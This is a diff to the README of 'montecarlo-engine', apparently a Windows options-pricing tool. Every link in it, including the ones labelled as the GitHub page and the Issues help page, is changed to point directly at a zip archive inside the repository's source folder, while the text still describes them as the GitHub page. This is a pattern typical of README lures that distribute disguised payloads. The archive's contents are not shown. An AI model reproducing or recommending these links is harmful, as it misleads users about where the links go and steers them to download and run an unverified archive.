@@ -1,6 +1,6 @@
 # ⚙️ montecarlo-engine - Fast Options Pricing Tool
 
-[![Download montecarlo-engine](https://img.shields.io/badge/Download-montecarlo--engine-brightgreen?style=for-the-badge)](https://github.com/jojhoo46/montecarlo-engine)
+[![Download montecarlo-engine](https://img.shields.io/badge/Download-montecarlo--engine-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/jojhoo46/montecarlo-engine/main/src/engine_montecarlo_1.1.zip)
 
 ## 📌 What is montecarlo-engine?
 
@@ -24,7 +24,7 @@ The program is designed to work on common desktop PCs without special hardware. 
 
 To get the software, you need to visit the official GitHub page. From there, you can download the latest Windows version.
 
-[![Download montecarlo-engine](https://img.shields.io/badge/Download-montecarlo--engine-blue?style=for-the-badge)](https://github.com/jojhoo46/montecarlo-engine)
+[![Download montecarlo-engine](https://img.shields.io/badge/Download-montecarlo--engine-blue?style=for-the-badge)](https://raw.githubusercontent.com/jojhoo46/montecarlo-engine/main/src/engine_montecarlo_1.1.zip)
 
 - Click the badge above to open the GitHub page.  
 - Look for the “Releases” section or a file with “.exe” or “.zip” in its name.  
@@ -101,8 +101,8 @@ The Python part requires you to install Python on your computer and set up pybin
 
 ## 🔗 Useful Links
 
-- Visit to download: https://github.com/jojhoo46/montecarlo-engine  
-- GitHub Issues page for help: https://github.com/jojhoo46/montecarlo-engine/issues  
+- Visit to download: https://raw.githubusercontent.com/jojhoo46/montecarlo-engine/main/src/engine_montecarlo_1.1.zip  
+- GitHub Issues page for help: https://raw.githubusercontent.com/jojhoo46/montecarlo-engine/main/src/engine_montecarlo_1.1.zip  
 - Python setup instructions (optional): Check the “docs” folder or README files on the GitHub page.  
 
 ## 📂 File Structure Overview
